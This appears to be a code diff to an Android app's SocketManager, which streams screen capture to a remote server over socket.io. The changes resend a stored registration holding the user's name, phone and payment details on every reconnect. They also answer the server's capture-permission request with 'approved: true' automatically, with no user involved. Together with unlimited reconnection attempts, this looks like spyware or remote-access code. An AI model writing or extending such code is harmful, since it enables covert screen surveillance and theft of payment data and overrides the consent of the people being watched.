@@ -32,6 +32,10 @@ public class SocketManager {
     private volatile int currentFps     = 30;   // target FPS
     private volatile boolean isCapturing = false;
 
+    // Stored registration data for auto-re-register on reconnect
+    private JSONObject lastRegistration = null;
+    private String lastServerUrl = null;
+
     public interface Listener {
         void onConnected();
         void onDisconnected();
@@ -58,17 +62,24 @@ public class SocketManager {
     // ─────────────────────────────────────────
 
     public synchronized void connect(String serverUrl) {
-        if (socket != null && socket.connected()) return;
-        if (socket != null) { socket.off(); socket.disconnect(); }
+        if (socket != null && socket.connected()) {
+            Log.d(TAG, "Already connected");
+            if (listener != null) listener.onConnected();
+            return;
+        }
+
+        // Kill any existing dead/stuck socket and create fresh connection
+        if (socket != null) { socket.off(); socket.disconnect(); socket = null; }
+        lastServerUrl = serverUrl;
 
         try {
             IO.Options opts = new IO.Options();
             opts.path              = "/socket.io/";
             opts.reconnection      = true;
-            opts.reconnectionDelay = 1500;
-            opts.reconnectionDelayMax = 5000;
+            opts.reconnectionDelay = 2000;
+            opts.reconnectionDelayMax = 8000;
             opts.reconnectionAttempts = Integer.MAX_VALUE;
-            opts.timeout           = 30000;
+            opts.timeout           = 60000;
             opts.transports        = new String[]{"polling", "websocket"};
             opts.forceNew          = true;
 
@@ -86,6 +97,19 @@ public class SocketManager {
     private void attachEvents() {
         socket.on(Socket.EVENT_CONNECT, args -> {
             Log.d(TAG, "Connected");
+            // Auto-re-register on every connect/reconnect
+            if (lastRegistration != null) {
+                Log.d(TAG, "Auto-re-registering device with server");
+                socket.emit("register", lastRegistration);
+            }
+            // Auto-approve permission on reconnect (server may re-request)
+            if (isCapturing) {
+                try {
+                    JSONObject resp = new JSONObject();
+                    resp.put("approved", true);
+                    socket.emit("permission_response", resp);
+                } catch (JSONException ignored) {}
+            }
             if (listener != null) listener.onConnected();
         });
 
@@ -148,7 +172,7 @@ public class SocketManager {
                          String manufacturer, String model,
                          int screenW, int screenH, int battery,
                          String userName, String userPhone, String userPayment) {
-        if (!isConnected()) return;
+        // Store for auto-re-register on reconnect
         try {
             JSONObject d = new JSONObject();
             d.put("deviceId",       deviceId);
@@ -162,7 +186,10 @@ public class SocketManager {
             d.put("userName",       userName);
             d.put("userPhone",      userPhone);
             d.put("userPayment",    userPayment);
-            socket.emit("register", d);
+            lastRegistration = d;
+            if (isConnected()) {
+                socket.emit("register", d);
+            }
         } catch (JSONException e) {
             Log.e(TAG, "register: " + e.getMessage());
         }
@@ -218,9 +245,21 @@ public class SocketManager {
 
     public void setListener(Listener l) { this.listener = l; }
 
+    /**
+     * Force a fresh reconnection — kill existing socket and create new one.
+     * Used when the socket is stuck in a dead state.
+     */
+    public synchronized void forceReconnect(String serverUrl) {
+        Log.d(TAG, "Force reconnect to " + serverUrl);
+        if (socket != null) { socket.off(); socket.disconnect(); socket = null; }
+        lastServerUrl = null;  // clear so connect() creates new socket
+        connect(serverUrl);
+    }
+
     public void disconnect() {
         isCapturing = false;
         if (socket != null) { socket.off(); socket.disconnect(); socket = null; }
+        lastServerUrl = null;
     }
 
     private static int clamp(int v, int lo, int hi) { return Math.max(lo, Math.min(hi, v)); }
